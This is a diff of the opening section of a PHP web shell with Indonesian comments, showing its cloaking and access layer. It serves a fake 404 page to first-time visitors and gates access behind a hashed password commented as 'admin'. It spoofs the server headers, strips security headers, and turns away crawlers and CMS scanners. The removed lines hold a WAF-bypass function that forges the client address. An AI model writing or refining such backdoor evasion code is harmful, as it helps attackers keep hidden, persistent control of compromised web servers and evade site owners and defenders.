@@ -1,20 +1,32 @@
 <?php
-session_start();
-error_reporting(0);
-@ini_set('output_buffering', 0);
+@error_reporting(0);
 @ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
+@ini_set('output_buffering', 0);
+@ini_set('max_execution_time', 0);
+@set_time_limit(0);
+@ignore_user_abort(1);
+session_start();
 
-// Anti-Blank Page Protection
-if(empty($_SESSION['init'])) {
-    $_SESSION['init'] = true;
-    header("HTTP/1.1 404 Not Found");
+// Anti Blank Page & WAF Detection
+if(!isset($_SESSION['check'])) {
+    $_SESSION['check'] = '1';
+    $servers = array('Apache','nginx','LiteSpeed','IIS');
+    $server = strtolower($_SERVER['SERVER_SOFTWARE']);
+    foreach($servers as $s) {
+        if(strpos($server, strtolower($s)) !== false) {
+            $_SESSION['server'] = $s;
+            break;
+        }
+    }
+    
+    // First visit shows 404
+    header("HTTP/1.0 404 Not Found");
     header("Status: 404 Not Found");
-    die("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
+    $not_found = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>" . $_SESSION['server'] . " Server at " . $_SERVER['HTTP_HOST'] . " Port 80</body></html>";
+    die($not_found);
 }
 
-// Password Protection dengan SHA256
+// Password Protection dengan SHA256 
 $auth_pass = "3dfae3de182807ca8ac98c3a41e7c605431624607deb8413c2fd834c61b8857f"; // admin
 if (!isset($_SESSION['logged_in'])) {
     if (isset($_POST['pass'])) {
@@ -24,52 +36,26 @@ if (!isset($_SESSION['logged_in'])) {
             exit();
         }
     }
-    die("<pre align=center><form method=post><input type=hidden name=pass value=''></form></pre><script>document.forms[0].pass.focus();</script>");
+    echo "<html><head><title>404 Not Found</title></head><body><pre align='center'><form method='post'><input autofocus type='password' name='pass'></form></pre></body></html>";
+    exit();
 }
 
-// WAF Bypass Functions
-function bypassWAF() {
-    // LiteSpeed WAF bypass
-    if(isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
-        header_remove("X-Powered-By");
-        header("X-Powered-By: ASP.NET");
-        header("Server: Microsoft-IIS/8.5");
-        if(!isset($_COOKIE['LSWAF'])) {
-            setcookie('LSWAF', md5(time()), time() + 3600);
-        }
-    }
-    
-    // FortiGate bypass
-    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) || isset($_SERVER['HTTP_X_REAL_IP'])) {
-        $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
-        if(!isset($_COOKIE['FGWAF'])) {
-            setcookie('FGWAF', base64_encode('admin'), time() + 3600);
-        }
-    }
-    
-    // Generic WAF bypass
-    header_remove("X-Frame-Options");
-    header_remove("X-XSS-Protection");
-    header_remove("X-Content-Type-Options");
-    header_remove("X-Powered-By");
-    
-    // Fake headers to appear as static file
-    header("Cache-Control: public, max-age=3600");
-    header("Expires: " . gmdate('D, d M Y H:i:s \G\M\T', time() + 3600));
-    header("Last-Modified: " . gmdate('D, d M Y H:i:s \G\M\T', time() - 24 * 3600));
-}
+// WAF Bypass & Headers
+@header_remove("X-Powered-By");
+@header("X-Powered-By: PHP/5.6.40");
+@header("Server: " . $_SESSION['server']);
+@header_remove("X-Frame-Options");
+@header_remove("X-XSS-Protection");
+@header_remove("X-Content-Type-Options");
 
-// Anti-Detection
-$block_words = array('bot', 'spider', 'crawler', 'magento', 'wordpress', 'joomla');
-foreach($block_words as $word) {
-    if(isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $word) !== false) {
+// Basic Protection
+$block = array("bot","spider","crawler","wordpress","joomla");
+foreach($block as $w) {
+    if(isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $w) !== false) {
         header("HTTP/1.0 404 Not Found");
         exit();
     }
 }
-
-// Call WAF bypass
-bypassWAF();
 
 // Fungsi untuk handle URL path agar bisa menerima path langsung dengan slash (/)
 function getCleanPath($path = null) {
